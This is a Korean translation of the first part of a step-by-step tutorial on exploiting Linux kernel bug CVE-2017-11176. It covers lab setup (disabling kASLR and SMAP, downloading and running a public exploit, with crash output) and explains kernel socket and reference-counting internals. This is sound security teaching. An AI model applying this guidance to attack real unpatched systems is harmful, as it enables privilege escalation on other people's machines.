---
layout: post
title:  "CVE-2017-11176 : 한 걸음 한 걸음 리눅스 커널 익스플로잇하기 (part 1/4)"
date:   2019-08-11 17:08:11 +0900
categories: 취약점 공부
---
*LEXFO의 [CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 1/4)](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html)를 번역한 문서입니다. 번역이 애매한 경우엔 원래의 단어를 옆에 적어두었습니다.*

# 소개

이 시리즈는 CVE 설명으로부터 한 단계씩 리눅스 커널 익스플로잇을 만들어가는 과정을 담고 있다. 단계에 따라 총 4개의 파트로 나뉜다. [part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)에서 패치를 분석하여 버그의 내용을 이해한 뒤 그것을 커널 영역(kernel land)에서 트리거한다. [part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196)에선 그것을 통해 동작하는 PoC 코드를 만든다. 그리고 [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 PoC 코드를 arbitrary call primitive로 바꾼 뒤 최종적으로 [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)에서 링 0 레벨에서 임의적인 코드를 실행하게 된다.

많은 커널 익스플로잇 문서에서 독자가 이미 커널 코드에 익숙하다고 가정한다. 하지만 이 글은 초심자를 위해 쓰인 글로, 중요한 개념을 같이 설명하여 그 간극을 줄이기 위해 노력하였다. 글을 다 읽었을 땐 **익스플로잇 코드의 모든 줄을 이해하고, 그것이 커널에 어떻게 영향을 미치는지 알 수 있을 것이다.**

한 문서에서 모든 내용을 다룰 순 없지만 이 문서는 익스플로잇 개발을 위해 알아야 하는 모든 커널 경로(kernel path)를 설명하는 것을 목표로 한다. 실습으로 배우는 리눅스 커널 여행이라고 생각하자. 익스플로잇 코드를 작성해보는 건 커널을 이해하는 아주 좋은 방법이다. 추가로 디버깅 기술, 툴, 빈번하게 나오는 애로 사항과 그것을 해결하는 방법을 볼 것이다.

여기서 다루는 취약점은 "mq\_notify: double sock\_put()"으로 알려져 있는 [CVE-2017-11176](https://nvd.nist.gov/vuln/detail/CVE-2017-11176)이다. 이 취약점에 대한 패치는 2017년 중순에 대부분의 리눅스 배포판에서 이루어졌다. 이 문서가 쓰인 시점엔 공개된 익스플로잇이 없다.

문서에 수록된 커널 코드는 v2.6.32.x 버전의 코드이고, 4.11.9. 버전까지 취약점이 존재한다. 이 버전이 너무 오래 된 버전이라고 생각할 수 있지만 아직 많이 쓰이고 있고, 비교적 이해하기 쉽다. 그리고 이전 버전의 코드를 알면 최신 커널 코드에서 같은 부분을 찾아내기 쉽다.

여기서 만드는 익스플로잇 코드는 타겟이 정해져 있지 않다. 특정 타겟에서 작동하게 하려면 수정(structure offsets/layout, gadgets, function addresses...)을 좀 해야 한다. 익스플로잇을 그대로 돌리면 시스템이 **고장날 것**이니 돌리지 말자! 최종 익스플로잇 코드는 [여기](https://github.com/lexfo/linux/blob/master/cve-2017-11176.c)에서 받을 수 있다.

취약한 커널의 [소스 코드](https://www.kernel.org/)를 받아서 쭉 읽어보는 것을 권장한다. 익스플로잇을 구현해보면 더 좋다. 선호하는 [코드 크롤링](https://www.owasp.org/index.php/Crawling_Code) 툴을 켜고 이제 시작해보자!

**주의**: 이 시리즈의 분량에 겁먹지 말자. 코드가 많이 포함되어서 그렇다! 커널 해킹에 입문하려면 많은 코드와 문서를 볼 준비를 해야 한다. 시간을 많이 투자하자.

**노트**: *우리가 이 CVE를 발견한 것은 아니다. 그저 원데이 익스플로잇을 구현한 것이다.*

- - -

## 목차

* [추천 도서](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#recommended-reading)
* [환경 설정하기](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#lab-setup)
* [핵심 개념 #1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#core-concepts)
* [공개된 정보](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#public-information)
* [버그 이해하기](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#understanding-the-bug)
* [Retry Logic 도달하기](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#reaching-the-retry-logic)
* [강제로 트리거하기](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#forcing-the-trigger)
* [결론](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#conclusion)
- - -
## <a name='recommended-reading'></a>추천 도서

이 글은 커널의 작은 부분들만을 다룬다. 아래 책들을 읽어보면 도움이 될 것이다(완전 좋다!) :

* Understanding the Linux Kernel (D. P. Bovet, M.Cesati)
* Understanding Linux Network Internals (C. Benvenuti)
* A guide to Kernel Exploitation: Attacking the Core (E. Perla, M. Oldani)
* Linux Device Drivers (J. Corbet, A. Rubini, G. Kroah-Hartman)
- - -
## <a name='lab-setup'></a>환경 설정하기

**업데이트**: Thanks to readers feedbacks, this section has been updated (2018-10-22).

여기 쓰인 코드는 2.6.32.x 버전에서 나온 코드이다. 그러나, 아래 나오는 타겟에 익스플로잇을 실행해보기 바란다. 별로 방해가 되지 않는 몇 몇 차이가 존재할 것이다.

[Debian 8.6.0 (amd64) ISO](https://cdimage.debian.org/mirror/cdimage/archive/8.6.0-live/amd64/iso-hybrid/debian-live-8.6.0-amd64-standard.iso)

이 ISO는 **3.16.36** 버전의 커널을 기반으로 한다. 우린 해당 버전에서도 버그에 도달하여 커널 크래시를 일으킬 수 있다는 것만 확인하였다. 대부분의 변경점은 익스플로잇의 마지막 부분(part 3,4)에서 등장한다.

버그가 여러 환경/구조에서 익스플로잇이 가능하지만, 아래 요구 사항들은 충족되어야 한다:

* 커널 버전이 4.11.9보다 낮을 것 (4.x 미만의 버전을 추천함)
* "amd64" (x86-64) 아키텍처에서 구동될 것
* 디버깅을 위한 루트 권한 보유
* 커널에서 SLAB allocator를 사용할 것
* SMEP이 활성화되어 있을 것
* kASLR과 SMAP이 비활성화되어 있을 것
* 메모리가 512MB 이상일 것
* CPU 수는 상관없지만 하나로도 충분

**주의**: 제시된 타겟(Debian 8.6.0)의 차이점 때문에 CPU 수를 하나로 맞추는 것을 권장한다. 그렇지 않으면 재할당(reallocation) 단계에서 해줘야 할 일이 늘어날 수 있다(part 3).

제시된 타겟의 기본 환경은 모든 요구 사항을 만족한다. 다른 타겟에서 익스플로잇을 하고 싶다면 다음 섹션을 보길 바란다.

SLAB/SMEP/SMAP이 뭔지 몰라도 걱정하지 말자. [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)와 [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)에서 다룰 것이다.

**주의**: 디버깅을 용이하게 하기 위해 타겟을 가상 머신에서 돌려아 하는데 *virtualbox*는 SMEP를 지원하지 않는다(글이 쓰인 시점 기준). 따라서 *vmware*의 무료 버전이나 SMEP를 지원하는 다른 가상화 툴을 사용해야 한다.

시스템이 **설치되었으면**(LiveCD를 이용하지 말 것)  환경 설정이 예상대로 되어있는지 확인해야 한다.

### Checking SLAB/SMEP/SMAP/KASLR Status

다음 명령어를 통해 SMEP의 활성화 여부를 알아보자. "smep" 문자열이 존재해야 한다:

```bash
$ grep "smep" /proc/cpuinfo
flags   : [...] smep bmi2 invpcid
                ^--- this one
```

문자열이 존재하지 않는다면 **cat /proc/cmdline** 에 **nosmep** 문자열이 확실히 없는지 확인해라. 만일 존재한다면 **/etc/default/grub** 파일에서 아래 값들을 수정해야 한다.

```plaintext
# /etc/default/grub
GRUB_CMDLINE_LINUX_DEFAULT="quiet"          // "nosmep"이 없어야 함
GRUB_CMDLINE_LINUX="initrd=/install/initrd.gz"  // "nosmep"이 없어야 함
```

수정한 후 **update-grub** 명령어를 입력하고 시스템을 재부팅하라. 그런 후에도 여전히 SMEP이 비활성화되어 있으면(*/proc/cpuinfo*를 체크할 것) 다른 가상화 툴을 사용해야 한다.

SMAP은 SMEP과 정확히 반대로 해야 한다. 먼저 grep 명령어로 */proc/cpuinfo*에서 "smep"을 찾는다. 아무것도 나오지 않는다면 설정이 잘 되어있는 것이다. 그렇지 않으면 grub 설정 파일에 "nosmap"을 추가한 후 *update-grub*을 하고 재부팅하자.

여기서 개발된 익스플로잇은 "하드코딩된" 주소를 사용하므로 kASLR의 비활성화가 필수적이다. kASLR은 커널에 대한 *ASLR*([Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization))이다. 비활성화를 하려면 grub cmdline에 **nokaslr** 옵션을 추가해야 한다(*nosmap*과 동일). 최종적으로 grub cmdline은 다음과 같은 모습이 된다:

```plaintext
GRUB_CMDLINE_LINUX_DEFAULT="quiet nokaslr nosmap"
GRUB_CMDLINE_LINUX="initrd=/install/initrd.gz"
```

마지막으로, 타겟은 *SLAB* Allocator를 사용해야 한다. 커널이 SLAB를 사용한다는 것을 다음 방법으로 확인할 수 있다:

```bash
$ grep "CONFIG_SL.B=" /boot/config-$(uname -r)
CONFIG_SLAB=y
```

**CONFIG_SLAB=y**여야 한다. 데비안은 SLAB을 기본으로 사용하는 반면 우분투는 SLUB를 기본으로 사용한다. 타겟이 SLAB를 사용하지 않고 있다면 **커널을 재컴파일해야 한다**. 배포판의 문서를 읽어보자.

다시 강조하지만, 제시된 타겟은 모든 요구 사항을 만족하므로 다 잘 되어있는지 확인만 하면 된다.

### Installing SystemTap

이전에 말했던 것처럼 타겟은 우리가 다룰 취약점이 있는 *v3.16.36 (uname -v)* 커널을 기반으로 한다([v3.16.47](https://lwn.net/Articles/732094/)에서 패치됨).

**주의**: systemtap 설치 절차를 거치면 커널이 업데이트될 수 있으므로 절대 하지 말자!

이런 문제 때문에 버전에 맞는 *.deb* 패키지를 수동으로 설치해야 한다. 필요한 것은 다음과 같다:

* linux-image-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb
* linux-image-3.16.0-4-amd64-dbg_3.16.36-1+deb8u1_amd64.deb
* linux-headers-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb

[이 링크](https://snapshot.debian.org/package/linux/3.16.36-1%2Bdeb8u1/)에서 다운로드하거나 다음 명령어를 입력하자:

```bash
# wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-image-3.16.0-4-amd64_3.16.36-1%2Bdeb8u1_amd64.deb
# wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-image-3.16.0-4-amd64-dbg_3.16.36-1%2Bdeb8u1_amd64.deb
# wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-headers-3.16.0-4-amd64_3.16.36-1%2Bdeb8u1_amd64.deb
```

그 후 다음 명령어를 통해 설치하자:

```bash
# dpkg -i linux-image-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb
# dpkg -i linux-image-3.16.0-4-amd64-dbg_3.16.36-1+deb8u1_amd64.deb
# dpkg -i linux-headers-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb
```

설치를 마쳤으면 재부팅을 한 뒤 다음 명령어로 system tap을 설치하자:

```bash
# apt install systemtap
```

마지막으로 다 잘 되었는지 확인해보자:

```plaintext
# stap -v -e 'probe vfs.read {printf("read performed\n"); exit()}'
stap: Symbol `SSL_ImplementedCiphers' has different size in shared object, consider re-linking
Pass 1: parsed user script and 106 library script(s) using 87832virt/32844res/5328shr/28100data kb, in 100usr/10sys/118real ms.
Pass 2: analyzed script: 1 probe(s), 1 function(s), 3 embed(s), 0 global(s) using 202656virt/149172res/6864shr/142924data kb, in 1180usr/730sys/3789real ms.
Pass 3: translated to C into "/tmp/stapWdpIWC/stap_1390f4a5f16155a0227289d1fa3d97a4_1464_src.c" using 202656virt/149364res/7056shr/142924data kb, in 0usr/20sys/23real ms.
Pass 4: compiled C into "stap_1390f4a5f16155a0227289d1fa3d97a4_1464.ko" in 6310usr/890sys/13392real ms.
Pass 5: starting run.
read performed                                      // <--------------
Pass 5: run completed in 10usr/20sys/309real ms.
```

### Last Minute Checks
##### Updated (2018-10-22)

system tap 외에도 타겟 커널은 익스플로잇을 컴파일하고 실행하는 데 사용될 것이다. 그러니 다음 명령어를 실행하자:

```bash
# apt install binutils gcc
```

그리고 [익스플로잇](https://github.com/lexfo/linux/blob/master/cve-2017-11176.c)을 다음 명령어로 다운로드하자:

```bash
$ wget https://raw.githubusercontent.com/lexfo/linux/master/cve-2017-11176.c
```

**제시된 타겟과 문서에서 사용하는 타겟의 차이로 인해 여기서 이용되는 "used-after-freed" 오브젝트는 "kmalloc-1024"가 아닌 "kmalloc-2048" 캐시에 있다.** 따라서 아래 라인을 익스플로잇에서 수정하자:

```c
define KMALLOC_TARGET 2048 // instead of 1024
```

이는 타겟이 정해진 익스플로잇에서 발생하는 문제점이다. part 3를 읽으면 수정한 이유를 알게 될 것이다. 이제 익스플로잇을 빌드하고 실행해보자:

```bash
$ gcc -fpic -O0 -std=c99 -Wall -pthread cve-2017-11176.c -o exploit
$ ./exploit
[ ] -={ CVE-2017-11176 Exploit }=-
[+] successfully migrated to CPU#0
[+] userland structures allocated:
[+] g_uland_wq_elt = 0x120001000
[+] g_fake_stack   = 0x20001000
[+] ROP-chain ready
[ ] optmem_max = 20480
[+] can use the 'ancillary data buffer' reallocation gadget!
[+] g_uland_wq_elt.func = 0xffffffff8107b6b8
[+] reallocation data initialized!
[ ] initializing reallocation threads, please wait...
[+] 200 reallocation threads ready!
[+] reallocation ready!
[+] 300 candidates created
[+] parsing '/proc/net/netlink' complete
[+] adjacent candidates found!
[+] netlink candidates ready:
[+] target.pid = -4590
[+] guard.pid  = -4614
[ ] preparing blocking netlink socket
[+] receive buffer reduced
[ ] flooding socket
[+] flood completed
[+] blocking socket ready
[+] netlink fd duplicated (unblock_fd=403, sock_fd2=404)
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 576 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 404 fd
[ ][unblock] unblocking now
[ 55.395645] Freeing alive netlink socket ffff88001aca5800
[+] mq_notify succeed
[+] guard socket closed
[ 60.399964] general protection fault: 0000 [#1] SMP
... cut (other crash dump info) ...

<<< HIT CTRL-C >>>
```

타겟이 다르기 때문에 익스플로잇에 실패하고 루트 권한도 얻지 못 했다. part 3 과 4를 보면 알겠지만 수정이 필요하다. 그러나 방금의 결과는 우리가 버그에 도달할 수 있다는 것을 입증해준다.

**주의**: 문서에서 쓰인 타겟과 제시된 타겟의 다른 차이점들 때문에 **커널 크래시가 나지 않을 것이다**(part 2 참고). 그 이유는 커널이 위와 같은 특정 에러에선 크래시가 나지 않고 익스플로잇을 종료시키기 때문이다. 그러나 커널은 불안정한 상태에 있고 언제든 크래시가 날 수 있다. 코드를 읽고 어떤 차이점이 있는지 이해하는 것을 권장한다.

### Getting Kernel Source Code

시스템을 설치하여 준비가 되었다면 커널 소스 코드를 얻을 차례다. 타겟이 *구식(outdated)* 커널을 쓰므로 다음 명령어를 이용하자:

```bash
# wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-source-3.16_3.16.36-1%2Bdeb8u1_all.deb
```

그리고 다음 명령어를 입력한다:

```bash
# dpkg -i linux-source-3.16_3.16.36-1+deb8u1_all.deb
```

커널 소스 코드는 다음 위치에 존재해야 한다: **/usr/src/linux-source-3.16.tar.xz**

타겟 커널이 **크래시가 잘 나므로**, 커널 코드 분석과 익스플로잇 개발을 **호스트 시스템에서** 수행해야 한다. That is, get those source back to your host system. 타겟은 SystemTap을 이용하는 것과 익스플로잇을 컴파일하고 실행하는 데만 이용해야 한다(ssh를 쓰자!).

여기서부턴 어떤 코드 크롤링 툴을 사용해도 된다. 심볼들을 효율적으로 상호 참조(cross-reference)할 **필요가 있다**. 그렇지 않으면 리눅스의 수많은 코드 사이에서 길을 잃을지도 모른다.

많은 커널 개발자들은 **cscope**를 사용한다. [이 방법](http://cscope.sourceforge.net/large_projects.html)을 사용하거나 다음 명령어를 사용하여 상호 참조를 만들어낼 수 있다:

```plaintext
cscope -kqRubv
```

*-k* 한정자(modifier)가 마치 커널이 [freestanding](https://wiki.osdev.org/C_Library#Freestanding_and_Hosted)으로 돌아가는 것처럼 시스템 라이브러리 헤더를 제외한다는 점에 주목하자. cscope 데이터베이스 생성엔 시간이 몇 분 걸린다. 생성이 되면 그에 대한 플러그인이 있는 에디터(vim, emacs 등)를 이용하자.

이제 우리의 첫 커널 익스플로잇을 개발할 준비가 된 것이다.

행운을 빈다. 제대로 놀아보자! 😁
- - -
## <a name='core-concepts'></a>핵심 개념 #1

CVE 분석 과정에서 길을 잃지 않으려면 리눅스 커널의 몇 몇 핵심 개념에 대해 알아야 한다. 여기서 나오는 대부분의 구조체는 간단하게 보여주기 위해 간소화되었다는 점에 유의하자.

### Process descriptor (task\_struct) and the current macro

커널에서 제일 중요한 구조체 중 하나는 **struct task\_struct**이다. 다만 결코 간단하진 않다.

모든 태스크는 메모리 상에 *task\_struct* 오브젝트를 가지고 있다. 유저 영역(userland)의 *프로세스*는 하나 이상의 태스크로 이루어져 있다. 멀티 스레드 응용 프로그램에선 각각의 스레드가 하나의 *task\_struct*를 가지고 있다. 커널 스레드도 각자의 고유한 task\_struct를 가지고 있다(kworker, migration 등).

task\_struct는 다음과 같은 중요한 정보를 담고 있다:

```c
// [include/linux/sched.h]

struct task_struct {
    volatile long state;            // process state (running, stopped, ...)
    void *stack;                    // task's stack pointer
    int prio;                       // process priority
    struct mm_struct *mm;           // memory address space
    struct files_struct *files;     // open file information
    const struct cred *cred;        // credentials
  // ...
};
```

현재 구동중인 task에 접근하는 것은 흔한 작업이기 때문에 포인터를 얻는 매크로가 존재한다: **current**.

### File Descriptor, File Object and File Descriptor Table

*모든 것이 파일이다*라는 말은 누구나 알고 있다. 이 말이 [의미하는 것](https://yarchive.net/comp/linux/everything_is_file.html)은 뭘까?

리눅스 커널엔 기본적으로 일곱 가지 종류의 파일이 존재한다: regular, directory, link, character device, block device, fifo and socket. 이들 각각은 **file descriptor**를 통해 보일(represented) 수 있다. file descriptor는 주어진 프로세스에만 의미가 있는 정수(integer)이다. 각각의 file descriptor엔 연관된 구조체인 **struct file**이 있다.

struct *file*(혹은 file 오브젝트)은 **열려 있는** 파일을 나타낸다(represent). 디스크에 저장된 파일과는 연결되지 않는다. 예를 들어 **/proc**과 같은 *pseudo-file systems* 안의 파일에 접근한다고 생각해보자. 시스템은 파일을 읽는 과정 중에 커서를 추적하고 있어야(keep track of) 할지도 모른다. 이러한 정보가 struct file에 들어있는 정보이다. struct file에 대한 포인터는 *filp*(file pointer)라고 한다.

struct file에서 가장 중요한 필드는 이것이다:

```c
// [include/linux/fs.h]

struct file {
    loff_t                            f_pos;            // "cursor" while reading file
    atomic_long_t                     f_count;          // object's reference counter
    const struct file_operations      *f_op;            // virtual function table (VFT) pointer
    void                              *private_data;    // used by file "specialization"
  // ...
};
```

file descriptor를 struct file 포인터로 바꿔주는 매핑을 담당하는 건 **file descriptor table (fdt)**이다. 이 매핑은 일대일이 아니므로 여러 file descriptor가 한 file 오브젝트를 가리키고 있을 수 있다. 이 경우 가리켜진 file 오브젝트의 레퍼런스 카운트가 하나 올라간다([Reference Counters](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#reference-counters) 참고). FDT는 **struct fdtable** 구조체에 저장되어 있다. 이 구조체는 file descriptor로부터 인덱싱될 수 있는 struct file 포인터의 배열이다.

```c
// [include/linux/fdtable.h]

struct fdtable {
    unsigned int max_fds;
    struct file ** fd;      /* current fd array */
  // ...
};
```

file descriptor table을 프로세스와 연결해주는 것은 **struct files\_struct**이다. fdtable이 task_struct에 직접 내장되어 있지 않은 이유는 다른 정보(close on exec bitmask 등)가 담겨있기 때문이다. struct *files\_struct* 또한 여러 스레드(= *task_struct*) 사이에 공유될 수 있으며, 몇 몇 최적화 요령(optimization trick)도 존재한다.

```
// [include/linux/fdtable.h]

struct files_struct {
    atomic_t count;           // reference counter
    struct fdtable *fdt;      // pointer to the file descriptor table
  // ...
};
```

*files\_struct*에 대한 포인터는 *task\_struct*에 저장되어 있다(*files* 필드).

### Virtual Function Table (VFT)

대부분 C로 짜인 리눅스는 *객체 지향형* 커널이다. *일반성(genericity)*를 획득하는 한 가지 방법은 **virtual function table (vft)**를 이용하는 것이다. virtual function table은 대부분이 함수 포인터로 구성된 구조체이다.

제일 잘 알려진 VFT는 **struct file\_operations**이다:

```c
// [include/linux/fs.h]

struct file_operations {
    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
    int (*open) (struct inode *, struct file *);
    int (*release) (struct inode *, struct file *);
  // ...
};
```

*모든 것이 파일*이지만 다 같은 타입이 아니므로 타입마다 각기 다른 **file operations**가 있다. 이를 **f\_ops**라 부른다. 이를 통해 커널 코드에서 파일을 파일의 타입이나 code factorization과 관계 없이 다룰 수 있다. 다음과 같은 코드가 된다:

```c
        if (file->f_op->read)
            ret = file->f_op->read(file, buf, count, pos);
```

### Socket, Sock and SKB

**struct socket**은 네트워크 스택의 최상위 계층에 있다. file 관점에서 이는 특수화(specialization)의 첫 단계이다.소켓 생성 중에 새로운 struct file이 생성되고 file operation (*f\_op* 필드)dl **socket\_file\_ops**로 설정된다.

모든 file이 file descriptor를 통해 표현되므로(represented) file descriptor를 인자로 쓰는 syscall(read(), write(), close() 등)은 뭐든 사용할 수 있다. 이것이 "*모든 것이 파일이다*"라는 모토의 주요한 장점이다. 커널은 소켓의 타입과 상관 없이 generic socket file operation을 호출할 수 있다:

```c
// [net/socket.c]

static const struct file_operations socket_file_ops = {
    .read = sock_aio_read,      // <---- calls sock->ops->recvmsg()
    .write =    sock_aio_write, // <---- calls sock->ops->sendmsg()
    .llseek =   no_llseek,      // <---- returns an error
  // ...
}
```

*struct socket*  이 *BSD socket API* (connect(), bind(), accept(), listen(), ...)를 구현(implement)하기 때문에 **struct proto\_ops** 타입의 특별한 *virtual function table (vft)* 를 내장(embed)하고 있다.

```c
// [include/linux/net.h]

struct proto_ops {
    int     (*bind)    (struct socket *sock, struct sockaddr *myaddr, int sockaddr_len);
    int     (*connect) (struct socket *sock, struct sockaddr *vaddr,  int sockaddr_len, int flags);
    int     (*accept)  (struct socket *sock, struct socket *newsock, int flags);
  // ...
}
```

BSD 스타일의 syscall(예 : bind())이 호출되면 커널은 다음 순서(scheme)를 따른다:

1. file descriptor table로부터 *struct file*을 얻는다.
2. *struct file* 로부터 *struct socket* 을 얻는다.
3. 특수한(specialized) *proto\_ops*  콜백을 호출한다 (예 : sock->ops->bind())

몇 몇 프로토콜 작업(operation) (예: 데이터 전송/수신)에서 네트워크 스택의 하위 레이어로 갈(go into) 필요가 있기 때문에, *struct socket*은 **struct sock** 에 대한 포인터를 가지고 있다. 이 포인터는 일반적으로 소켓 프로토콜 작업(*proto\_ops*)에 의해 사용된다. *struct socket*이 *struct file*과 *struct sock* 사이에서 접착제같은 역할을 하는 것이다.

```c
// [include/linux/net.h]

struct socket {
    struct file     *file;
    struct sock     *sk;
    const struct proto_ops  *ops;
  // ...
};
```

*struct sock*  은 복잡한 데이터 구조를 가지고 있다. 이는 상위 레이어(소켓)과 하위 레이어(네트워크 카드 드라이버) 사이의 중간자로 보이기도 한다. *struct sock* 은 receive/send buffer를 *generic*한 방식으로 잡고(hold) 있는 것이다.

네트워크 카드를 통해 패킷을 수신하면 드라이버는 네트워크 패킷을 sock receive buffer에 "enqueue"한다. 들어간 패킷은 프로그램이 받을 때까지(*recvmsg()* syscall) 버퍼에 남아있다. 반대로 프로그램이 데이터를 송신하고 싶다면(*sendmsg()* syscall), 네트워크 패킷은 sock sending buffer에 "enqueue"된다. 패킷은 네트워크 카드가 인지하는 순간 "dequeue"되고 송신된다.

이러한 "네트워크 패킷"들은 **struct sk\_buff**(혹은 skb)이다. receive/send 버퍼는 기본적으로 skb의 이중 연결 리스트이다:

```c
// [include/linux/sock.h]

struct sock {
    int         sk_rcvbuf;    // theorical "max" size of the receive buffer
    int         sk_sndbuf;    // theorical "max" size of the send buffer
    atomic_t        sk_rmem_alloc;  // "current" size of the receive buffer
    atomic_t        sk_wmem_alloc;  // "current" size of the send buffer
    struct sk_buff_head sk_receive_queue;   // head of doubly-linked list
    struct sk_buff_head sk_write_queue;     // head of doubly-linked list
    struct socket       *sk_socket;
  // ...
}
```

볼 수 있듯이 *struct sock* 은 *struct socket* 을 참조하고(*sk\_socket* 필드), *strcut socket* 은 *struct sock* 을 참조한다(*sk* 필드). 비슷한 방식으로는 *struct socket* 이 *struct file* 을 참조하고(*file* 필드), *struct file* 이 *struct socket* 을 참조하는 것이 있다(*private\_data* 필드). 이러한 "양방향 메커니즘"(2-way mechanism)은 데이터가 네트워크 스택을 통해 올라갔다 내려갔다 할 수 있게 해준다.

**노트**: 헷갈리지 말자! *struct sock*  오브젝트는 줄여서 *sk* 라 쓰고, *struct socket*  오브젝트는 줄여서 *sock* 이라고 한다.

### Netlink Socket

Netlink socket은 UNIX 소켓이나 INET 소켓처럼 소켓의 한 종류(i.e. family)이다.

Netlink socket (AF\_NETLINK)는 커널 공간과 유저 공간 사이의 통신을 가능하게 해준다. routing table을 수정하는 데도 쓰일 수 있고(NETLINK\_ROUTE protocol), SELinux event notification을 받는 데도 쓰일 수 있고(NETLINK\_SELINUX), 다른 유저 영역 프로세스와 통신하는 데도 쓰일 수 있다(NETLINK\_USERSOCK).

*struct sock* 과 *struct socket* 이 모든 소켓 종류를 지원하는 *generic* 한 데이터 구조다 보니 몇 몇 지점(point)에서 "특수화"(specialize)할 필요가 있다.

소켓 관점에서 *proto\_ops*  필드는 정의되어야 한다. netlnk family(AF\_NETLINK)를 위한 BSD-style 소켓 오퍼레이션은 **netlink\_ops**이다:

```c
// [net/netlink/af_netlink.c]

static const struct proto_ops netlink_ops = {
    .bind =     netlink_bind,
    .accept =   sock_no_accept,     // <--- calling accept() on netlink sockets leads to EOPNOTSUPP error
    .sendmsg =  netlink_sendmsg,
    .recvmsg =  netlink_recvmsg,
  // ...
}
```

소켓 관점에서 보면 이는 좀 더 복잡하다.*struct sock*  이 추상 클래스로 보일 수도 있다. 따라서 sock은 특수화될 필요가 있다. netlink의 경우는 **struct netlink\_sock**을 통해 특수화를 한다:

```c
// [include/net/netlink_sock.h]

struct netlink_sock {
    /* struct sock has to be the first member of netlink_sock */
    struct sock     sk;
    u32         pid;
    u32         dst_pid;
    u32         dst_group;
  // ...
};
```

다시 말해 *netlnk\_sock* 은 몇 몇 추가적인 속성이 더해진 "sock"이다(i.e. inheritance).

최상위 comment는 굉장히 중요하다(?). 커널이 generic한 *struct sock* 을 정확한 타입을 몰라도 다룰 수 있게 해준다.  It also brings another benefit, the *&netlink_sock.sk* and *&netlink_sock* addresses **aliases**(?). 그 결과 *&netlink\_sock.sk*  포인터를 해제하면 *netlink\_sock*  오브젝트가 전부 해제된다. language theory 관점에서 보면 이것이 바로 C언어가 지원하지 않음에도 커널이 *type polymorphism* 을 할 수 있는 이유이다. 따라서 *netlink\_sock*  life cycle logic은 generic하고 검증된 코드로 유지할 수 있다.

### Putting it all together

이제 핵심 데이터 구조는 다 소개하였다. 이제 서로의 관계를 그림으로 시각화해서 볼 차례다.

![Core Structure Relationship](https://blog.lexfo.fr/images/cve-2017-11176-linux/core_struct_relationship.png)

**읽을거리**: 각각의 화살표는 포인터를 의미한다. 어떤 선도 "교차하지" 않는다. "sock" 구조체는 "netlink\_sock" 구조체 안에 내장되어 있다.

### Reference counters

커널 핵심 개념에 대한 소개를 마치려면 리눅스 커널에서 **레퍼런스 카운터**를 어떻게 다루는지 이해해야 한다.

메모리 leak을 줄이고 *use-after-free*  를 방지하기 위해 대부분의 리눅스 데이터 구조는 "레퍼런스 카운터"를 내장하고 있다. 레퍼런스 카운터 자체는 보통 정수인 **atomic\_t**로 나타낸다(represent). 레퍼런스 카운터는 오직 다음과 같은 atomic operation을 통해서만 다룰 수 있다:

* **atomic\_inc()**
* **atomic\_add()**
* **atomic\_dec\_and\_test()** // 1을 빼고 0과 같은지 테스트

"smart pointer"(혹은 operator overload같은 것)와 같은 것이 존재하지 않기 때문에 레퍼런스 카운터를 다루는 것은 개발자에 의해 *수동으로*  이뤄진다. 이는 어떤 오브젝트가 다른 오브젝트에 의해 참조될 때, 참조된 오브젝트의 레퍼런스 카운터는 무조건 *명시적으로*(explicitly) 증가해야 한다는 것이다. 참조가 끝나면 레퍼런스 카운터는 무조건 *명시적으로*  감소해야 한다. 오브젝트는 일반적으로 레퍼런스 카운터가 0이 되면 해제된다.

**노트**: 레퍼런스 카운터를 증가시키는 것을 "참조한다"(taking a reference)라고 한다. 레퍼런스 카운터를 감소시키는 것은 "참조를 버린다/해제한다"(dropping/releasing)라고 한다.

그러나 이러한 방식으론 불균형이 있어서(예: 참조를 한 번 하고 두 번 해제하는 것) 언제든 memory corruption의 위험이 있다"

* 레퍼런스 카운터가 두 번 감소한다: *use-after-free*
* 레퍼런스 카운터가 두 번 증가한다: *use-after-free* 로 이어지는 memory leak 혹은 *int-overflow*

리눅스 커널은 레퍼런스 카운터를 다루기 위해 일반적인 인터페이스(common interface)로 되어 있는 여러 시설(facilities)을 가지고 있다(*kref,kobject*). 그러나 이것이 시스템적으로 사용되는 것은 아니고 우리가 여기서 다룰 오브젝트는 각자의 레퍼런스 카운터를 관리해주는 helper가 있다. 일반적으로 참조는 **"\*\_get()"** 과 같은 함수에서 이뤄지고, 참조 해제는 **"\*\_put()"**과 같은 함수에서 이뤄진다.

